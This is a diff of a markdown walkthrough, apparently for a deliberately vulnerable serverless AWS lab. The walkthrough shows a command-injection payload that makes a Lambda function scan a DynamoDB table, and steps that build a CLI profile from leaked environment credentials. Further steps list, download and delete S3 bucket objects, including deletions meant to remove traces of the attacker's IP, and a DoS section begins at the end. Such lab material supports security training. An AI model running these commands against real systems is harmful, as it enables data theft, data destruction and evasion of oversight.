@@ -58,13 +58,6 @@ e.g. `https://inject; pwd`
        * table name
        * s3 bucket name
 
-### Enumerating Permissions
-Obtain current profile information   
-**requires the profile information to be configured** *see Table Access with AWS CLI*
-`aws sts get-caller-identity --profile user666`
-**Improper Exception Handling and Verbose Errors**
-
-## Access S3 Bucket & Tables
 ### S3 Bucket Access with No Credentials
 1. Explore the bucket address by opening a new tab, and copying/pasting the URL in the old tab with modifications  
     * URL Modifications for the 2nd tab:  
@@ -78,7 +71,14 @@ This site also contains the **Insecure Serverless Deployment Configuration** vul
       * This page should be secured and encrypted instead of being publicly accessible 
 Return to the previous tab
 
-### Table Access with AWS CLI
+### Node.js Access
+Attempt to access content/information using Node.js 
+1. What version of node.js?
+```javascript 
+https://; node -e 'const AWS = require(\"aws-sdk\"); (async () => {console.log(await new AWS.DynamoDB.DocumentClient().scan({TableName: process.env.TABLE_NAME}).promise());})();'
+```
+## Enumeration
+### Profile Enumeration
 1. Using the information found in the env variables create a user profile 
 `aws configure profile --user666`  
     * aws_secret_access_key    
@@ -87,21 +87,27 @@ Return to the previous tab
 2. Add the aws_session_token to the end of the user profile configuration by editing the *~/.aws/credentials* file  
 `vim ~/.aws/credentials`  
 `aws_session_token = <aws_session_token>`
-3. List the database contents  
+3. Obtain current profile information 
+`aws sts get-caller-identity --profile user666`  
+**Improper Exception Handling and Verbose Errors**
+
+### Database Actions Enumeration
+1. Attempt to scan the database contents  
 `aws dynomodb scan --table-name <table-name> --profile user`
 
-### S3 Bucket Access with AWS CLI
-1. List Bucket Contents  
-`aws s3 ls <s3-bucket> --profile user`
-2. Download bucket contents  
+
+### S3 Bucket Actions Enumeration
+1. Attempt to list Bucket Contents  
+`aws s3 ls <s3-bucket> --profile user` 
+2. Attempt to download bucket contents  
 `aws s3 sync s3://<s3-bucket> . --profile user`
 3. Review downloaded bucket content  
 `ls -la`
 4. Display commands run via Lambda Function
 `cat <key>`
-5. Remove all traces of your IP address  
+5. Attempt to delete bucket contents  
 `aws s3api delete-object --bucket <s3-bucket> --key <key> --profile`
-6. Repeat for each key value found  
+6. Remove all traces of requests by your IP address by repeated step 5 for each key value found  
 
 ### DoS Attack
 Create a simple bash script to curl the site multiple times   
